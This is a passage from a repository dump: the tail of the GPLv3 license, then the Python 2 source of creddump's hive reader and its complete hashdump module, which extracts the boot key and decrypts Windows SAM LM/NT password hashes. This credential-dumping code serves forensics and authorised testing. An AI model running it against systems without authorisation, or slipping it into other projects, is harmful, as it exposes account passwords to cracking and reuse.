(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<http://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<http://www.gnu.org/philosophy/why-not-lgpl.html>.
Contact GitHub API Training Shop Blog About
© 2017 GitHub, Inc. Terms Privacy Security Status Help

```

`Configuration/creddump/addrspace.py`:

```py
# Volatility
# Copyright (C) 2007 Volatile Systems
#
# Original Source:
# Copyright (C) 2004,2005,2006 4tphi Research
# Author: {npetroni,awalters}@4tphi.net (Nick Petroni and AAron Walters)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or (at
# your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
#

"""
@author:       AAron Walters
@license:      GNU General Public License 2.0 or later
@contact:      awalters@volatilesystems.com
@organization: Volatile Systems
"""

""" Alias for all address spaces """

import os
import struct

class FileAddressSpace:
    def __init__(self, fname, mode='rb', fast=False):
        self.fname = fname
	self.name = fname
	self.fhandle = open(fname, mode)
        self.fsize = os.path.getsize(fname)

	if fast == True:
            self.fast_fhandle = open(fname, mode)

    def fread(self,len):
        return self.fast_fhandle.read(len)

    def read(self, addr, len):
        self.fhandle.seek(addr)
        return self.fhandle.read(len)

    def read_long(self, addr):
        string = self.read(addr, 4)
        (longval, ) =  struct.unpack('L', string)
        return longval

    def get_address_range(self):
        return [0,self.fsize-1]

    def get_available_addresses(self):
        return [self.get_address_range()]

    def is_valid_address(self, addr):
        return addr < self.fsize - 1

    def close():
        self.fhandle.close()

# Code below written by Brendan Dolan-Gavitt

BLOCK_SIZE = 0x1000

class HiveFileAddressSpace:
    def __init__(self, fname):
        self.fname = fname
        self.base = FileAddressSpace(fname)

    def vtop(self, vaddr):
        return vaddr + BLOCK_SIZE + 4

    def read(self, vaddr, length, zero=False):
        first_block = BLOCK_SIZE - vaddr % BLOCK_SIZE
        full_blocks = ((length + (vaddr % BLOCK_SIZE)) / BLOCK_SIZE) - 1
        left_over = (length + vaddr) % BLOCK_SIZE

        paddr = self.vtop(vaddr)
        if paddr == None and zero:
            if length < first_block:
                return "\0" * length
            else:
                stuff_read = "\0" * first_block
        elif paddr == None:
            return None
        else:
            if length < first_block:
                stuff_read = self.base.read(paddr, length)
                if not stuff_read and zero:
                    return "\0" * length
                else:
                    return stuff_read

            stuff_read = self.base.read(paddr, first_block)
            if not stuff_read and zero:
                stuff_read = "\0" * first_block

        new_vaddr = vaddr + first_block
        for i in range(0,full_blocks):
            paddr = self.vtop(new_vaddr)
            if paddr == None and zero:
                stuff_read = stuff_read + "\0" * BLOCK_SIZE
            elif paddr == None:
                return None
            else:
                new_stuff = self.base.read(paddr, BLOCK_SIZE)
                if not new_stuff and zero:
                    new_stuff = "\0" * BLOCK_SIZE
                elif not new_stuff:
                    return None
                else:
                    stuff_read = stuff_read + new_stuff
            new_vaddr = new_vaddr + BLOCK_SIZE

        if left_over > 0:
            paddr = self.vtop(new_vaddr)
            if paddr == None and zero:
                stuff_read = stuff_read + "\0" * left_over
            elif paddr == None:
                return None
            else:
                stuff_read = stuff_read + self.base.read(paddr, left_over)
        return stuff_read

    def read_long_phys(self, addr):
        string = self.base.read(addr, 4)
        (longval, ) =  struct.unpack('L', string)
        return longval

    def is_valid_address(self, vaddr):
        paddr = self.vtop(vaddr)
        if not paddr: return False
        return self.base.is_valid_address(paddr)

```

`Configuration/creddump/hashdump.py`:

```py
# This file is part of creddump.
#
# creddump is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# creddump is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with creddump.  If not, see <http://www.gnu.org/licenses/>.

"""
@author:       Brendan Dolan-Gavitt
@license:      GNU General Public License 2.0 or later
@contact:      bdolangavitt@wesleyan.edu
"""

from rawreg import *
from addrspace import HiveFileAddressSpace
from Crypto.Hash import MD5
from Crypto.Cipher import ARC4,DES
from struct import unpack,pack

odd_parity = [
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
]

# Permutation matrix for boot key
p = [ 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
      0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 ]

# Constants for SAM decrypt algorithm
aqwerty = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
anum = "0123456789012345678901234567890123456789\0"
antpassword = "NTPASSWORD\0"
almpassword = "LMPASSWORD\0"

empty_lm = "aad3b435b51404eeaad3b435b51404ee".decode('hex')
empty_nt = "31d6cfe0d16ae931b73c59d7e0c089c0".decode('hex')

def str_to_key(s):
    key = []
    key.append( ord(s[0])>>1 )
    key.append( ((ord(s[0])&0x01)<<6) | (ord(s[1])>>2) )
    key.append( ((ord(s[1])&0x03)<<5) | (ord(s[2])>>3) )
    key.append( ((ord(s[2])&0x07)<<4) | (ord(s[3])>>4) )
    key.append( ((ord(s[3])&0x0F)<<3) | (ord(s[4])>>5) )
    key.append( ((ord(s[4])&0x1F)<<2) | (ord(s[5])>>6) )
    key.append( ((ord(s[5])&0x3F)<<1) | (ord(s[6])>>7) )
    key.append( ord(s[6])&0x7F )
    for i in range(8):
        key[i] = (key[i]<<1)
        key[i] = odd_parity[key[i]]
    return "".join(chr(k) for k in key)

def sid_to_key(sid):
    s1 = ""
    s1 += chr(sid & 0xFF)
    s1 += chr((sid>>8) & 0xFF)
    s1 += chr((sid>>16) & 0xFF)
    s1 += chr((sid>>24) & 0xFF)
    s1 += s1[0];
    s1 += s1[1];
    s1 += s1[2];
    s2 = s1[3] + s1[0] + s1[1] + s1[2]
    s2 += s2[0] + s2[1] + s2[2]

    return str_to_key(s1),str_to_key(s2)

def find_control_set(sysaddr):
    root = get_root(sysaddr)
    if not root:
        return 1

    csselect = open_key(root, ["Select"])
    if not csselect:
        return 1

    for v in values(csselect):
        if v.Name == "Current": return v.Data.value

def get_bootkey(sysaddr):
    cs = find_control_set(sysaddr)
    lsa_base = ["ControlSet%03d" % cs, "Control", "Lsa"]
    lsa_keys = ["JD","Skew1","GBG","Data"]

    root = get_root(sysaddr)
    if not root: return None

    lsa = open_key(root, lsa_base)
    if not lsa: return None

    bootkey = ""

    for lk in lsa_keys:
        key = open_key(lsa, [lk])
        class_data = sysaddr.read(key.Class.value, key.ClassLength.value)
        bootkey += class_data.decode('utf-16-le').decode('hex')

    bootkey_scrambled = ""
    for i in range(len(bootkey)):
        bootkey_scrambled += bootkey[p[i]]

    return bootkey_scrambled

def get_hbootkey(samaddr, bootkey):
    sam_account_path = ["SAM", "Domains", "Account"]

    root = get_root(samaddr)
    if not root: return None

    sam_account_key = open_key(root, sam_account_path)
    if not sam_account_key: return None

    F = None
    for v in values(sam_account_key):
        if v.Name == 'F':
            F = samaddr.read(v.Data.value, v.DataLength.value)
    if not F: return None

    md5 = MD5.new()
    md5.update(F[0x70:0x80] + aqwerty + bootkey + anum)
    rc4_key = md5.digest()

    rc4 = ARC4.new(rc4_key)
    hbootkey = rc4.encrypt(F[0x80:0xA0])

    return hbootkey

def get_user_keys(samaddr):
    user_key_path = ["SAM", "Domains", "Account", "Users"]

    root = get_root(samaddr)
    if not root: return []

    user_key = open_key(root, user_key_path)
    if not user_key: return []

    return [k for k in subkeys(user_key) if k.Name != "Names"]

def decrypt_single_hash(rid, hbootkey, enc_hash, lmntstr):
    (des_k1,des_k2) = sid_to_key(rid)
    d1 = DES.new(des_k1, DES.MODE_ECB)
    d2 = DES.new(des_k2, DES.MODE_ECB)

    md5 = MD5.new()
    md5.update(hbootkey[:0x10] + pack("<L",rid) + lmntstr)
    rc4_key = md5.digest()
    rc4 = ARC4.new(rc4_key)
    obfkey = rc4.encrypt(enc_hash)
    hash = d1.decrypt(obfkey[:8]) + d2.decrypt(obfkey[8:])

    return hash

def decrypt_hashes(rid, enc_lm_hash, enc_nt_hash, hbootkey):
    # LM Hash
    if enc_lm_hash:
        lmhash = decrypt_single_hash(rid, hbootkey, enc_lm_hash, almpassword)
    else:
        lmhash = ""

    # NT Hash
    if enc_nt_hash:
        nthash = decrypt_single_hash(rid, hbootkey, enc_nt_hash, antpassword)
    else:
        nthash = ""

    return lmhash,nthash

def get_user_hashes(user_key, hbootkey):
    samaddr = user_key.space
    rid = int(user_key.Name, 16)
    V = None
    for v in values(user_key):
        if v.Name == 'V':
            V = samaddr.read(v.Data.value, v.DataLength.value)
    if not V: return None

    hash_offset = unpack("<L", V[0x9c:0x9c+4])[0] + 0xCC

    lm_exists = True if unpack("<L", V[0x9c+4:0x9c+8])[0] == 20 else False
    nt_exists = True if unpack("<L", V[0x9c+16:0x9c+20])[0] == 20 else False

    enc_lm_hash = V[hash_offset+4:hash_offset+20] if lm_exists else ""
    enc_nt_hash = V[hash_offset+(24 if lm_exists else 8):hash_offset+(24 if lm_exists else 8)+16] if nt_exists else ""

    return decrypt_hashes(rid, enc_lm_hash, enc_nt_hash, hbootkey)

def get_user_name(user_key):
    samaddr = user_key.space
    V = None
    for v in values(user_key):
        if v.Name == 'V':
            V = samaddr.read(v.Data.value, v.DataLength.value)
    if not V: return None

    name_offset = unpack("<L", V[0x0c:0x10])[0] + 0xCC
    name_length = unpack("<L", V[0x10:0x14])[0]

    username = V[name_offset:name_offset+name_length].decode('utf-16-le')
    return username

def dump_hashes(sysaddr, samaddr):
    bootkey = get_bootkey(sysaddr)
    hbootkey = get_hbootkey(samaddr,bootkey)

    pw_hashes = ''
    for user in get_user_keys(samaddr):
        lmhash,nthash = get_user_hashes(user,hbootkey)
        if not lmhash: lmhash = empty_lm
        if not nthash: nthash = empty_nt
        pw_hashes += "{0:15}:{1:6}:{2}:{3}:::\n".format(get_user_name(user), int(user.Name,16),
                            lmhash.encode('hex'), nthash.encode('hex'))
    return pw_hashes

def dump_file_hashes(syshive_fname, samhive_fname):
    sysaddr = HiveFileAddressSpace(syshive_fname)
    samaddr = HiveFileAddressSpace(samhive_fname)
    return dump_hashes(sysaddr, samaddr)

```

`Configuration/creddump/newobj.py`:

```py
# This file is part of creddump.
#
# creddump is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# creddump is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with creddump.  If not, see <http://www.gnu.org/licenses/>.

"""
